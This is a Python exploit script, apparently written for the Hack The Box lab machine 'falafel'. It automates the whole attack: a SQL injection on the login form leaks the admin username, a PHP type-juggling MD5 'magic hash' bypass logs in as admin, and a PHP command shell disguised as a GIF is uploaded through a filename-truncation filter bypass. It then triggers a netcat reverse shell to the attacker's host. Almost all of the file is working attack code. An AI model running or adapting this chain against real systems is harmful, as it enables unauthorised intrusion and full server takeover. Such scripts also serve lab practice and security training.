#!/usr/bin/python3

# This script was created to automate getting a reverse shell in falafel.htb machine via:
# + Use a SQL Injection vulnerability to obtain admin username
# + Use a PHP Juggling vulnerability to login as admin
# + Upload a php shell bypassing filters (filename length truncation)
# + Achieve RCE
# Author: @nightwolfx2

# Usage:
# On a separated terminal, start a netcat listener, example:
# $nc -l -p zzzz -v
#
# Run the exploit as follows:
# ─$ python3 falafel.py -t xx.xx.xx.xx -p ww -a yy.yy.yy.yy -l zzzz
# [+] Attempting to obtain a valid username
# [+] Username found: admin
# [+] Attempting to bypass authentication by finding the magic number (php juggling)
# [!] Successfully logged in
# [+] Starting HTTP Server on port 8443
# [+] Waiting for incoming connection to download a php cmd shell
# 10.10.10.73 - - [21/Feb/2022 18:55:09] "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif HTTP/1.1" 200 -
# [+] Reverse shell should be on its way to yy.yy.yy.yy on port zzzz

import argparse
import hashlib
import re
import requests
import threading
import http.server
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os

PROXIES = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

def obtain_username(full_target):
        username=""
        url = "http://%s/login.php" % full_target
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://" + full_target + "", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://"" + full_target + ""/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        data = {"username": "admin' or 1=1;#", "password": "dummy"}
        res = requests.post(url, headers=headers, data=data)
        body = str(res.text)
        username_pre = body.split("Wrong identification : ")[1].strip()
        username = username_pre.split("<")[0].strip()
        return username

def login_phpjuggling(full_target, s, username):
        url = "http://%s/login.php" % full_target
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://" + full_target + "", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://"" + full_target + ""/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        count = 0
        # It is possible to generate any number of random strings until one matches a type juggling candidate, however, it will take lot of time.
        '''
        for word in map(''.join, itertools.product(string.digits,repeat=int(10))):
                candidate = hashlib.md5(str(word).encode('utf-8')).hexdigest()
                #test   candidate = hashlib.md5(str("egNJHP66&3E1").encode('utf-8')).hexdigest()
                if re.match(r'0+[eE]\d+$', candidate):
                        print("[!] Found a candidate! Hash: %s" % candidate)
                        print("[!] Found a candidate! Value: %s" % word)
                        print("[!] Iterations were: %s" % str(count))
                        return word
                count += 1
        '''
        # One proposal to find easily a good candidate to exploit the PHP Juggling Vulnerability
        # is to generate just integers until one candidate (0e<digits>) is found
        for i in range (1,1000000000):
                candidate =  hashlib.md5(str(i).encode('utf-8')).hexdigest()
                if re.match(r'0+[eE]\d+$', candidate):
                        print("[!] Found a possible candidate %s" % (str(i)))
                        data = {"username": username, "password": "" + str(i)+ ""}
                        res = s.post(url, headers=headers, data=data)
                        if "Wrong identification" not in res.text:
                                print("[!] %s is the magic number" % str(i))
                                return i
        # Another proposal is to use know magic numbers to be good fits:
        # More information: https://offsec.almond.consulting/super-magic-hash.html
        # $ echo -n ".V;m=*]b?-" | md5sum
        #   00e45653718969294213009554265803
        #
        # $ echo -n "egNJHP66&3E1" | md5sum
        #   00e99757454497342716194968339146
        #
        # $ echo -n "KnCM6ogsNA1W" | md5sum
        #  00e73414578113850089230341919829
        #
        # $ echo -n "&rh1ls6cl&G4" | md5sum
        #  00e48890746054592674909531744787
        #
        # $ echo -n "240610708" | md5sum
        #  0e462097431906509019562988736854

def login(full_target, password, s):
        url = "http://%s/login.php" % full_target
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://" + full_target + "", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://"" + full_target + ""/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        data = {"username": "admin", "password": "" + password + ""}
        res = s.post(url, headers=headers, data=data)
        return res.content

def start_http(local_http_port):
        server = http.server.ThreadingHTTPServer(('0.0.0.0', local_http_port), SimpleHTTPRequestHandler)
        print("[+] Starting HTTP Server on port %s" % local_http_port)
        print("[+] Waiting for incoming connection to download a php cmd shell")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = False
        thread.start()

def create_shell(size):
        filename=("A"*size)
        filenameext=filename+".php.gif"
        if os.path.exists(filenameext):
                os.remove(filenameext)
        with open(filenameext, 'w') as f:
                f.write('GIF89a\r\n')
                f.write('<?php system($_GET[\'cmd\']); ?>')
        return filename

def upload_file(full_target, file_name, s, attacker_ip, local_http_port):
        out_path = ""
        url = "http://%s/upload.php" % full_target
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://" + full_target + "", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://" + full_target + "/upload.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        data = {"url": "http://" + attacker_ip + ":" + str(local_http_port) + "/" + file_name + ""}
        res = s.post(url, headers=headers, data=data, proxies=PROXIES)
        out_path = re.search(r"CMD: cd /var/www/html(/uploads/[\w\-]+);", res.text).group(1)
        return out_path

def rce(full_target, filename, s, path, attacker_ip, attacker_port ):
        url = "http://" + full_target + path + "/" + filename + ".php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" + attacker_ip + "+" + attacker_port + "+>/tmp/f"
        headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        res = s.get(url, headers=headers)

def main():
        print("Skeleton")

if __name__ == '__main__':
        username=""
        s = requests.session()
        local_http_port = 8443
        magic_number = 0
        parser = argparse.ArgumentParser()
        parser.add_argument('-t','--target', help='host/ip to target, required=True')
        parser.add_argument('-p','--port', help='target port, required=True')
        parser.add_argument('-a','--attacker', help='attacker_ip, required=True')
        parser.add_argument('-l','--listener', help='attacker port listening, required=True')
        args = parser.parse_args()
        full_target = args.target + ":" + args.port
        attacker_ip = args.attacker
        attacker_port = args.listener
        print("[+] Attempting to obtain a valid username")
        username=obtain_username(full_target)
        if username!="":
                print("[+] Username found: %s" % username)
                print("[+] Attempting to bypass authentication by finding the magic number (php juggling)")
                magic_number=str(login_phpjuggling(full_target, s, username))
                if magic_number == 0:
                        print("[-] Error, magic number couldn't be found")
                        exit(0)
                password=magic_number
                result=login(full_target, password, s)
                if "Login Successful" in str(result):
                        print("[!] Successfully logged in")
                        start_http(local_http_port)
                        filename=create_shell(232)
                        path=upload_file(full_target, filename+".php.gif", s, attacker_ip, local_http_port)
                        print("[+] Reverse shell should be on its way to %s on port %s" % (attacker_ip, attacker_port))
                        rce(full_target, filename, s, path, attacker_ip, attacker_port)
